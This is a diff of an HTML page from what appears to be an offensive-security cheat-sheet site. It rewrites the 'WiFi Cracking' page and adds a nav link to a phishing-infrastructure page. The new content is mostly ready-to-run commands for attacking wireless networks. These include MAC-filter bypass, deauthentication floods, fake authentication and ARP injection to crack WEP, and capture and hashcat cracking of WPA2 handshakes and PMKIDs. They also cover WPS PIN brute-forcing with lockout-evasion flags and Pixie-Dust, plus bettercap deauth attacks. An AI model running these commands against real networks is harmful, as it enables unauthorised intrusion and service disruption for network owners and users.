@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-10-07T17:44:25 CEST">
+<meta name="revised" content="2019-11-01T16:53:25 CET">
 <title>WiFi Cracking :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -1293,6 +1293,21 @@
     </li>
         </ul>
     </li>
+    <li data-nav-id="/phishing-redteam-and-se/" class="dd-item haschildren
+        ">
+      <div>
+      <a href="/phishing-redteam-and-se/">Phishing, RedTeam and SE</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+        <ul>
+      <li data-nav-id="/phishing-redteam-and-se/phishing_campaign_setup/" class="dd-item">
+        <div>
+          <a href="/phishing-redteam-and-se/phishing_campaign_setup/">
+            Phishing Infrastructure (Gophish&#43;Vultr)
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+        </ul>
+    </li>
 
 
 
@@ -1334,6 +1349,8 @@
       <option value="/wireless/wifi_cracking/"  selected>- WiFi Cracking</option>
       <option value="/wireless/rogue_ap/" >- Rogue AP Attack</option>
   
+    <option value="/phishing-redteam-and-se/" >
+   Phishing, RedTeam and SE</option>
 
 
 
@@ -1362,26 +1379,173 @@
     
     
 
-<h3 id="aircrack-ng-suite">Aircrack-NG Suite</h3>
-<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Turning on the monitor mode</span>
-<span style="color:#75715e"># We can not see packages from SSIDs that we are not associated with</span>
-airmon-ng start wlan0**
-    
-<span style="color:#75715e"># Monitoring</span>
-<span style="color:#75715e"># We capture packages running:</span>
-airodump-ng mon0**
+<h3 id="general-informations">General Informations</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Bypass MAC filter</span>
+macchanger –m B0:D0:9C:5C:EF:86 wlan0</code></pre></div>
+<p><br/></p>
 
-<span style="color:#75715e"># Speeding up</span>
-<span style="color:#75715e"># We can launch a de-authentication attack to speed up the process:</span>
-aireplay-ng -0 <span style="color:#ae81ff">3</span> -a &lt;macaddress of the ap&gt; mon0**
+<h3 id="monitoring-recon-and-dumping">Monitoring, Recon and Dumping</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Using the aircrack-ng suite</span>
+<span style="color:#75715e"># Turning on the monitor mode</span>
+sudo airmon-ng start wlan0mon
 
-<span style="color:#75715e"># Capturing packages</span>
-airodump-ng mon0 --bssid –c <span style="color:#f92672">(</span>channel<span style="color:#f92672">)</span> –w <span style="color:#f92672">(</span>file name to save<span style="color:#f92672">)</span>**
+<span style="color:#75715e"># Simple passive listening and capture</span>
+<span style="color:#75715e"># Used to discover AP in the environment</span>
+sudo airodump-ng wlan0mon
 
-<span style="color:#75715e"># Cracking the cap</span>
-aircrack-ng RHAWEP-0.1-cap -w /wordlist**</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Bypass MAC filter</span>
-macchanger –m B0:D0:9C:5C:EF:86 wlan0**</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Cracking WPS</span>
-reaver –i mon0 –b &lt;bssid&gt; –d <span style="color:#ae81ff">0</span>**</code></pre></div>
+<span style="color:#75715e"># Targetted listening and capture</span>
+<span style="color:#75715e"># Focus on one AP and one channel</span>
+sudo airodump-ng wlan0mon --bssid xx:xx:xx:xx:xx:xx –c <span style="color:#ae81ff">1</span> –w outfile</code></pre></div>
+<p><br/></p>
+
+<h3 id="attacking-wep">Attacking WEP</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># WEP is an old encryption protocol but still used in some places</span>
+<span style="color:#75715e"># It is vulnerable to direct cracking attacks</span>
+
+<span style="color:#75715e"># The only requirement is to get enough IV</span>
+<span style="color:#75715e"># The process can be enhanced by sending deauth packets</span>
+<span style="color:#75715e"># -0 == detauth attack, sending 3 packets (can be increased)</span>
+aireplay-ng -0 <span style="color:#ae81ff">3</span> -a &lt;TARGET_AP_MAC&gt; wlan0mon -w 
+
+<span style="color:#75715e"># Another possibility is to use fake authentication to generate IV</span>
+<span style="color:#75715e"># -1 = fake authentication</span>
+<span style="color:#75715e"># 0 = delay between association demands</span>
+<span style="color:#75715e"># -e = AP ESSID (name)</span>
+<span style="color:#75715e"># -a = AP MAC</span>
+<span style="color:#75715e"># -h = attacker MAC</span>
+aireplay-ng -1 <span style="color:#ae81ff">0</span> -e teddy -a <span style="color:#ae81ff">00</span>:14:6C:7E:40:80 -h <span style="color:#ae81ff">00</span>:0F:B5:88:AC:82 wlan0mon
+
+<span style="color:#75715e"># ARP Sniffing and injection is another method</span>
+aireplay-ng -3 -b <span style="color:#ae81ff">00</span>:14:6C:7E:40:80 -h <span style="color:#ae81ff">00</span>:0F:B5:88:AC:82 wlan0mon
+
+<span style="color:#75715e"># Using aircrack-ng it is possible to directly crack the WEP Key</span>
+aircrack-ng outfile -w wordlist</code></pre></div>
+<p><br/></p>
+
+<h3 id="attacking-wpa2-psk-the-old-way">Attacking WPA2 PSK (The old way)</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Using the aircrack-ng suite</span>
+<span style="color:#75715e"># You can first focus one AP using airodump-ng (see monitoring section)</span>
+<span style="color:#75715e"># Here, you want to get the 4-way WPA Handshake</span>
+<span style="color:#75715e"># It requires network traffic between the AP and one device</span>
+
+<span style="color:#75715e"># Dumping</span>
+sudo airodump-ng wlan0mon --bssid xx:xx:xx:xx:xx:xx –c <span style="color:#ae81ff">1</span> –w outfile
+
+<span style="color:#75715e"># Deauth connected devices to initiate authentication process and try to get the handshake</span>
+aireplay-ng --deauth <span style="color:#ae81ff">15</span> -a &lt;TARGET_AP_MAC&gt; wlan0mon
+aireplay-ng -0 <span style="color:#ae81ff">15</span> -a &lt;TARGET_AP_MAC&gt; wlan0mon 
+
+<span style="color:#75715e"># In the airodump-ng console, the WPA handshake will appear once captured</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Cracking can be done using aircrack-ng</span>
+aircrack-ng outfile -w wordlist
+
+<span style="color:#75715e"># But also using other tools like hashcat</span>
+<span style="color:#75715e"># The outfile needs to be an HCCAPX file</span>
+<span style="color:#75715e"># Hashcat utils provide a binary to convert</span>
+.<span style="color:#8045ff">\c</span>ap2hccapx.exe WPA2_test.cap-01.cap WPA2_test.hccapx
+
+<span style="color:#75715e"># Then you can crack it like a normal hash (see hashcat section)</span>
+.<span style="color:#8045ff">\h</span>ashcat64.exe -m <span style="color:#ae81ff">2500</span> WPA2_test.hccapx wordlist.txt --force -O</code></pre></div>
+<p><br/></p>
+
+<h3 id="attacking-wpa2-using-pmkid">Attacking WPA2 using PMKID</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># You don&#39;t need any network traffic</span>
+<span style="color:#75715e"># Using hcxtools and hcxdumptool</span>
+
+<span style="color:#75715e"># Monitor mode</span>
+sudo airmon-ng start wlan0mon
+
+<span style="color:#75715e"># PMKID capture</span>
+<span style="color:#75715e"># It can take a while to capture PKMID (several minutes++)</span>
+<span style="color:#75715e"># If an AP recieves our association request packet and supports sending</span> 
+sudo hcxdumptool -i wlan0mon -o outfile.pcapng --enable_status<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+
+<span style="color:#75715e"># Then convert the captured data to a suitable format for hashcat</span>
+<span style="color:#75715e"># -E retrieve possible passwords from WiFi-traffic (additional, this list will include ESSIDs)</span>
+<span style="color:#75715e"># -I retrieve identities from WiFi-traffic</span>
+<span style="color:#75715e"># -U retrieve usernames from WiFi-traffic</span>
+sudo hcxpcaptool -E essidlist -I identitylist -U usernamelist -z test.16800 test.pcapng
+
+<span style="color:#75715e"># Then, you can use hashcat to crack it (see hashcat section)</span>
+./hashcat -m <span style="color:#ae81ff">16800</span> test.16800 -a <span style="color:#ae81ff">3</span> -w <span style="color:#ae81ff">3</span> <span style="color:#d88200">&#39;?l?l?l?l?l?lt!&#39;</span></code></pre></div>
+<p><br/></p>
+
+<h3 id="attacking-wps-wifi-protected-setup">Attacking WPS (WiFi Protected Setup)</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Reaver Attack</span>
+<span style="color:#75715e"># Online bruteforcing of the WPS 8-digits PIN</span>
+<span style="color:#75715e"># Kinda old and can be obsolete nowadays, but still usable</span>
+
+<span style="color:#75715e"># Reaver integrated dumping tool (can also airodump-ng)</span>
+<span style="color:#75715e"># Wash gives information about WPS being locked or not</span>
+<span style="color:#75715e"># Locked WPS will have less success chances</span>
+wash -i wlan0mon
+
+<span style="color:#75715e"># Launching reaver</span>
+reaver -i wlan0mon -c <span style="color:#ae81ff">6</span> -b <span style="color:#ae81ff">00</span>:23:69:48:33:95 -vv
+
+<span style="color:#75715e"># Some manufacturers have implemented protections</span>
+<span style="color:#75715e"># You can try different switches to bypass</span>
+<span style="color:#75715e"># -L = Ignore locked state</span>
+<span style="color:#75715e"># -N = Don&#39;t send NACK packets when errors are detected</span>
+<span style="color:#75715e"># -d = delay X seconds between PIN attempts</span>
+<span style="color:#75715e"># -T = set timeout period to X second (.5 means half second)</span>
+<span style="color:#75715e"># -r = After X attemps, sleep for Y seconds</span>
+reaver -i mon0 -c <span style="color:#ae81ff">6</span> -b <span style="color:#ae81ff">00</span>:23:69:48:33:95  -vv -L -N -d <span style="color:#ae81ff">15</span> -T .5 -r <span style="color:#ae81ff">3</span>:15</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Pixie-Dust Attack</span>
+<span style="color:#75715e"># Done with Reaver + PixieWPS</span>
+<span style="color:#75715e"># This attack is based on seed / false random</span>
+
+<span style="color:#75715e"># Start reaver, we need the PKE, PKR, e-hash 1 &amp; e-hash 2, E-nonce / R-nonce</span> 
+<span style="color:#75715e"># and the authkey from Reaver to use for pixiewps</span>
+reaver -i wlan0mon -c <span style="color:#ae81ff">6</span> -b <span style="color:#ae81ff">00</span>:23:69:48:33:95 -vv -S
+
+<span style="color:#75715e"># Now using pixiexps, you can crack PIN offline</span>
+pixiewps -e &lt;pke&gt; -r &lt;pkr&gt; -s &lt;e-hash1&gt; -z &lt;e-hash2&gt; -a &lt;authkey&gt; -n &lt;e-nonce&gt;
+
+<span style="color:#75715e"># Then, you can use the PIN with reaver to get to cleartext password</span>
+reaver -i &lt;monitor interface&gt; -b &lt;bssid&gt; -c &lt;channel&gt;  -p &lt;PIN&gt;</code></pre></div>
+<p><br/></p>
+
+<h3 id="bettercap-pwning">Bettercap Pwning</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Deauth and 4-way handshake attack</span>
+sudo bettercap -iface wlan0
+
+<span style="color:#75715e"># Start the monitoring mode</span>
+&gt; wifi.recon on
+
+<span style="color:#75715e"># Set the AP sorting by clients number</span>
+&gt; <span style="color:#111">set</span> wifi.show.sort clients desc
+
+<span style="color:#75715e"># Every 1 sec, clear view and display an updated one</span>
+&gt; <span style="color:#111">set</span> ticker.commands <span style="color:#d88200">&#39;clear; wifi.show&#39;</span>
+&gt; ticker on
+
+<span style="color:#75715e"># Set the target channel</span>
+&gt; wifi.recon.channel <span style="color:#ae81ff">1</span>
+
+<span style="color:#75715e"># Initiate deauth packets</span>
+&gt; wifi.deauth e0:xx:xx:xx:xx:xx
+
+<span style="color:#75715e"># Convert</span>
+/path/to/cap2hccapx /root/bettercap-wifi-handshakes.pcap bettercap-wifi-handshakes.hccapx
+
+<span style="color:#75715e"># Cracking</span>
+/path/to/hashcat -m2500 -a3 -w3 bettercap-wifi-handshakes.hccapx <span style="color:#d88200">&#39;?d?d?d?d?d?d?d?d&#39;</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Client-less PMKID Attack</span>
+<span style="color:#75715e"># PMKID = HMAC-SHA1-128(PMK, &#34;PMK Name&#34; | MAC_AP | MAC_STA)</span>
+sudo bettercap -iface wlan0
+
+<span style="color:#75715e"># Start the monitoring mode</span>
+&gt; wifi.recon on
+
+<span style="color:#75715e"># As long as the PMK is constant, we just need to get one to initiate attack</span>
+<span style="color:#75715e"># Instead of deauth others, we will associate to the AP and listen which one</span>
+<span style="color:#75715e"># Send good informations</span>
+<span style="color:#75715e"># wifi.assoc supports &#39;all&#39; (or `*`) or a specific BSSID, just like wifi.deauth</span>
+&gt; wifi.assoc all
+
+<span style="color:#75715e"># Convert</span>
+/path/to/hcxpcaptool -z bettercap-wifi-handshakes.pmkid /root/bettercap-wifi-handshakes.pcap
+
+<span style="color:#75715e"># Cracking</span>
+/path/to/hashcat -m16800 -a3 -w3 bettercap-wifi-handshakes.pmkid <span style="color:#d88200">&#39;?d?d?d?d?d?d?d?d&#39;</span></code></pre></div>
 
     
     
